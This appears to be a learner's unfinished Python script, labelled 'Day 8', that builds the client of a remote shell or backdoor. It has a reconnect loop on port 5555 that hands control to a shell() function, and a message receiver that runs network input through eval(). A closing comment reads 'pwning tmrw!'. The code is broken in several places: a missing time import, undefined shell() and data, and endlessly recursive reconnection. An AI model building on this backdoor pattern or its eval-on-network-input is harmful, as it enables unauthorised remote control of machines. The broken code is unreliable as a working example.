# Day 8 - The Json Module

import socket
import json

def ip_address():
    global server_ip
    serv_ip = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    serv_ip.connect(("8.8.8.8", 80))
    server_ip = serv_ip.getsockname()[0]
    serv_ip.close()
    return server_ip

########################

server_ip = ip_address() 
server_port = 5555

########################

def connection():
    while True:
        time.sleep(0)
        try:
            client.connect((server_ip, server_port))
            shell()
            client.close()
            break
        except:
            connection()


def json_send():
    jsondata = json.dumps(data)
    client.send(jsondata.encode())

def json_recv(size=1024):
    data = ''
    while True:
        try:
            data += client.recv(size).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def message_send(string, size=8):
    no_str = False
    if type(string) != str:
        string =str(string)
        no_str = True
    body = string.encode()
    length = len(body)
    header = str(length).encode()
    header += b' ' * (size - len(header))
    client.send(header)
    client.send(body)
    if no_str == True:
        client.send('T'.encode())
    else:
        client.send('F'.encode())

def message_recv(size=8):
    while True:
        header = client.recv(size).decode()
        if header:
            body_size = int(header)
            body = client.recv(body_size).decode()
            no_str = client.recv(1).decode()
            break
    if no_str == 'T':
        body = eval(body)
    return body

def client_conn():
    global client
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    client.connect((server_ip,server_port)) 


client_conn()

# testing



# pwning tmrw!